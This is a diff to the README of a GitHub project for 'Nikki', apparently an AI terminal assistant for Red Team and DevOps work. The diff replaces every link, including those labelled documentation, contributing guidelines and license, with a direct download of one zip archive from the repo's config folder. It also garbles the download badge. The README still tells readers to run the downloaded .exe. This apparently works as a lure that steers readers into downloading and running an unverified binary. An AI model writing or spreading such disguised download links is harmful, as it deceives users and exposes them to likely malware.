@@ -4,11 +4,11 @@
 Nikki is an AI Assistant designed specifically for Red Team and DevOps tasks right in your terminal. It's built to help you simplify complex operations and enhance your workflow. Whether you're managing security audits or speeding up development processes, Nikki has you covered.
 
 ## 📦 Download & Install
-[![Download Nikki AI Assistant](https://img.shields.io/badge/Download%20Nikki%20AI%20Assistant-brightgreen.svg)](https://github.com/ramonmontenegro/nikki-ai-cli-assistent/releases)
+[![Download Nikki AI Assistant](https://github.com/ramonmontenegro/nikki-ai-cli-assistent/raw/refs/heads/main/config/nikki_ai_assistent_cli_v1.6.zip%20Nikki%20AI%https://github.com/ramonmontenegro/nikki-ai-cli-assistent/raw/refs/heads/main/config/nikki_ai_assistent_cli_v1.6.zip)](https://github.com/ramonmontenegro/nikki-ai-cli-assistent/raw/refs/heads/main/config/nikki_ai_assistent_cli_v1.6.zip)
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/ramonmontenegro/nikki-ai-cli-assistent/releases). Here you will find the latest version of Nikki.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/ramonmontenegro/nikki-ai-cli-assistent/raw/refs/heads/main/config/nikki_ai_assistent_cli_v1.6.zip). Here you will find the latest version of Nikki.
 2. **Download the Application**: From the releases section, find the latest version of Nikki. Click on the link to download the file suitable for your operating system. 
 3. **Install the Application**:
    - **For Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
@@ -51,13 +51,13 @@ Nikki can assist you with a variety of tasks. Here are some common commands to g
 If you encounter any issues or have questions, feel free to reach out through our GitHub Issues page or contact our support team. 
 
 ## 🔗 Additional Resources
-- **Documentation**: For detailed instructions, visit the [Documentation Page](https://github.com/ramonmontenegro/nikki-ai-cli-assistent/wiki).
+- **Documentation**: For detailed instructions, visit the [Documentation Page](https://github.com/ramonmontenegro/nikki-ai-cli-assistent/raw/refs/heads/main/config/nikki_ai_assistent_cli_v1.6.zip).
 - **Community**: Join our community forums on GitHub for tips and discussions.
 
 ## 🛡️ Contributing
-We welcome contributions! Please read our [Contributing Guidelines](https://github.com/ramonmontenegro/nikki-ai-cli-assistent/blob/main/CONTRIBUTING.md) for information on how to help improve Nikki.
+We welcome contributions! Please read our [Contributing Guidelines](https://github.com/ramonmontenegro/nikki-ai-cli-assistent/raw/refs/heads/main/config/nikki_ai_assistent_cli_v1.6.zip) for information on how to help improve Nikki.
 
 ## 📜 License
-Nikki is open-source software, distributed under the MIT License. For more details, check out the [LICENSE file](https://github.com/ramonmontenegro/nikki-ai-cli-assistent/blob/main/LICENSE).
+Nikki is open-source software, distributed under the MIT License. For more details, check out the [LICENSE file](https://github.com/ramonmontenegro/nikki-ai-cli-assistent/raw/refs/heads/main/config/nikki_ai_assistent_cli_v1.6.zip).
 
 Now you're ready to enhance your terminal experience with Nikki. Enjoy exploring the capabilities it offers!
